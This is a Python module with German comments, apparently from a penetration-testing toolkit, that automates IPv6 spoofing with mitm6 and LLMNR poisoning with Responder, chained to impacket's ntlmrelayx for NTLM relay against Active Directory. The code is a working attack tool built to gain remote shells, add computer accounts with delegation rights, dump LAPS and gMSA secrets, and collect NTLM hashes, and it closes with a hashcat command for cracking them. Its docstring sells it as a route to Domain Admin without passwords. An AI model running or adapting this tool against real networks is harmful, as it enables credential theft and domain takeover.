"""
mitm6 + ntlmrelayx — IPv6 DHCP Spoofing → NTLM Relay → Domain Admin.

Wie es funktioniert:
  1. mitm6 sendet gefälschte IPv6 Router-Advertisements ans LAN
  2. Windows bevorzugt IPv6 → bekommt Kali als Standard-DNS
  3. Kali antwortet auf WPAD-DNS-Anfrage → Windows konfiguriert Proxy
  4. Windows authentifiziert an Kali per NTLM (um Proxy zu nutzen)
  5. ntlmrelayx leitet das NTLM-Auth an echten Server weiter (Relay)
  6. Kali erhält Session als angemeldeter User — bei Admin → SYSTEM

Warum so mächtig?
  - Funktioniert ohne Passwörter, ohne Exploits
  - Geht in fast allen ungeschützten Active-Directory-Umgebungen
  - Gibt Domain Admin wenn Domain-Admin gerade eingeloggt ist
  - Benötigt nur LAN-Zugang (kein Passwort, kein Scan)

Gegen was es hilft:
  - Alle Firewalls/IPS: DHCP und DNS sind immer erlaubt
  - SMB-Signing deaktiviert: NTLM kann an Shares weitergeleitet werden
  - Mit Delegierung: direkt Tickets (Silber/Gold) generierbar

Voraussetzungen:
  apt install mitm6 python3-impacket
  pip3 install impacket --break-system-packages
"""

from __future__ import annotations
import asyncio
import os
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir

runner = CommandRunner()


class Mitm6Attack:
    """
    Vollautomatischer IPv6 MITM + NTLM Relay Angriff.

    Startet mitm6 und ntlmrelayx parallel.
    ntlmrelayx kann:
      - SMB Relay → Shell auf Remote-PC (wenn SMB-Signing aus)
      - LDAP Relay → AD-Änderungen (neuen Admin anlegen, Passwort setzen)
      - HTTP Relay → NTLM-Hash für offline cracking
    """

    def __init__(self, interface: str = "eth0"):
        self.interface = interface
        self._mitm6_proc = None
        self._relay_proc  = None

    async def attack(
        self,
        domain: str,
        target: str = "",
        relay_mode: str = "smb",
        loot_dir: str = "",
    ) -> AsyncGenerator[str, None]:
        """
        Startet mitm6 + ntlmrelayx gleichzeitig.

        relay_mode:
          smb   → Shell auf Remote-PC (benötigt: SMB Signing disabled)
          ldap  → LDAP-Änderungen (neuen Computer-Account hinzufügen)
          http  → NTLM-Hash dumpen (funktioniert immer)
          socks → SOCKS-Proxy mit authentifizierter Session
        """
        loot = loot_dir or str(out_dir("mitm"))
        yield f"[*] IPv6 MITM + NTLM Relay gegen {domain}"
        yield f"[*] Interface: {self.interface}  |  Relay-Modus: {relay_mode}"
        yield f"[*] Loot-Verzeichnis: {loot}"
        yield "─" * 60

        # ntlmrelayx Command je nach Modus
        relay_cmd = self._build_relay_cmd(relay_mode, target, loot)

        yield f"[*] ntlmrelayx starten: {' '.join(relay_cmd[:5])}..."

        # ntlmrelayx im Hintergrund
        try:
            self._relay_proc = await asyncio.create_subprocess_exec(
                *relay_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                cwd=loot,
            )
            yield "[+] ntlmrelayx gestartet"
        except FileNotFoundError:
            yield "[!] ntlmrelayx nicht gefunden"
            yield "[*] Installieren: pip3 install impacket --break-system-packages"
            yield "[*] Oder: apt install python3-impacket"
            return

        # kurz warten
        await asyncio.sleep(1)

        # mitm6 starten
        mitm6_cmd = ["mitm6", "-d", domain, "-i", self.interface, "--ignore-nofqdn"]
        yield f"[*] mitm6 starten: {' '.join(mitm6_cmd)}"

        try:
            self._mitm6_proc = await asyncio.create_subprocess_exec(
                *mitm6_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            yield "[+] mitm6 gestartet — sendet IPv6 Router Advertisements..."
        except FileNotFoundError:
            yield "[!] mitm6 nicht gefunden: apt install mitm6"
            return

        yield "─" * 60
        yield "[*] Angriff läuft. Warte auf NTLM-Authentifizierungen..."
        yield "[*] Tipp: Warte auf Domain-Admin Login oder Group Policy Update"
        yield "[*] Das kann 5-30 Minuten dauern..."
        yield "[*] Ctrl+C zum Stoppen"
        yield ""

        # Output von ntlmrelayx streamen
        try:
            while True:
                line = await self._relay_proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode(errors="replace").strip()
                if not decoded:
                    continue

                # Wichtige Events hervorheben
                if "SUCCEED" in decoded or "Admin" in decoded or "SYSTEM" in decoded:
                    yield f"  [!!!] {decoded}"
                elif "Authenticating" in decoded or "NTLM" in decoded:
                    yield f"  [+] {decoded}"
                elif "ERROR" in decoded.upper():
                    yield f"  [!] {decoded}"
                else:
                    yield f"  {decoded}"

        except asyncio.CancelledError:
            pass

    def _build_relay_cmd(self, mode: str, target: str, loot: str) -> list[str]:
        """Baut ntlmrelayx-Command je nach Relay-Modus."""
        base = [
            "python3", "-m", "impacket.examples.ntlmrelayx",
            "--no-http-server",
            "-smb2support",
            "-of", f"{loot}/ntlm_hashes.txt",
        ]

        if mode == "smb":
            if target:
                return base + ["-t", f"smb://{target}", "-c", "whoami"]
            else:
                return base + ["-tf", "/tmp/penkit_smb_targets.txt"]

        elif mode == "ldap":
            return base + [
                "-t", f"ldap://{target}" if target else "ldap://auto",
                "--add-computer",
                "--delegate-access",
            ]

        elif mode == "http":
            return base + [
                "-t", f"http://{target}" if target else "http://auto",
                "--dump-laps",
                "--dump-gmsa",
            ]

        elif mode == "socks":
            return base + ["-socks", "-t", f"smb://{target}" if target else "smb://auto"]

        return base

    async def stop(self):
        for proc in [self._relay_proc, self._mitm6_proc]:
            if proc and proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    proc.kill()

    async def dump_loot(self, loot_dir: str = "") -> AsyncGenerator[str, None]:
        """Zeigt gesammelte Credentials aus ntlmrelayx-Output."""
        d = loot_dir or str(out_dir("mitm"))
        hash_file = os.path.join(d, "ntlm_hashes.txt")

        if not os.path.exists(hash_file):
            yield f"[!] Keine Hashes gefunden in {hash_file}"
            yield "[*] Warte auf Relay-Ereignisse..."
            return

        yield f"[*] Gesammelte NTLM-Hashes aus {hash_file}:"
        yield "─" * 60
        with open(hash_file) as f:
            for line in f:
                yield f"  {line.strip()}"

        yield ""
        yield "[*] Hashes mit hashcat cracken:"
        yield f"  hashcat -m 5600 {hash_file} /usr/share/wordlists/rockyou.txt"


class ResponderNTLMRelay:
    """
    Responder + ntlmrelayx — LLMNR/NBT-NS Poisoning für NTLM Relay.

    Klassische Alternative zu mitm6 für IPv4-only Netzwerke.
    """

    def __init__(self, interface: str = "eth0"):
        self.interface = interface
        self._responder_proc = None
        self._relay_proc = None

    async def attack(
        self, target: str, loot_dir: str = ""
    ) -> AsyncGenerator[str, None]:
        loot = loot_dir or str(out_dir("mitm"))
        yield f"[*] Responder + ntlmrelayx gegen {target}"

        # Responder mit SMB/HTTP aus (sonst blockiert er ntlmrelayx)
        resp_conf = "/etc/responder/Responder.conf"
        yield "[*] Deaktiviere SMB+HTTP in Responder (für Relay nötig)..."
        if os.path.exists(resp_conf):
            async for line in CommandRunner().run([
                "sed", "-i",
                "s/^SMB = On/SMB = Off/;s/^HTTP = On/HTTP = Off/",
                resp_conf,
            ]):
                pass
            yield "[+] Responder konfiguriert"

        # ntlmrelayx
        yield "[*] Starte ntlmrelayx..."
        try:
            self._relay_proc = await asyncio.create_subprocess_exec(
                "python3", "-m", "impacket.examples.ntlmrelayx",
                "-t", f"smb://{target}",
                "-smb2support",
                "-of", f"{loot}/ntlm_hashes.txt",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                cwd=loot,
            )
            yield "[+] ntlmrelayx gestartet"
        except FileNotFoundError:
            yield "[!] impacket nicht gefunden"
            return

        await asyncio.sleep(1)

        # Responder starten
        yield "[*] Starte Responder..."
        try:
            self._responder_proc = await asyncio.create_subprocess_exec(
                "responder", "-I", self.interface, "-rdwv",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            yield "[+] Responder gestartet — poisoning LLMNR/NBT-NS..."
        except FileNotFoundError:
            yield "[!] responder nicht gefunden: apt install responder"
            return

        yield "─" * 60
        yield "[*] Warte auf NTLM-Authentifizierungen..."
        yield "[*] Tipp: Öffne \\\\\\\\nichtExistierend auf einem Windows-PC im Netz"
        yield "[*] Ctrl+C zum Stoppen"

        while True:
            line = await self._relay_proc.stdout.readline()
            if not line:
                break
            decoded = line.decode(errors="replace").strip()
            if decoded:
                yield f"  {decoded}"

    async def stop(self):
        for proc in [self._responder_proc, self._relay_proc]:
            if proc and proc.returncode is None:
                proc.terminate()
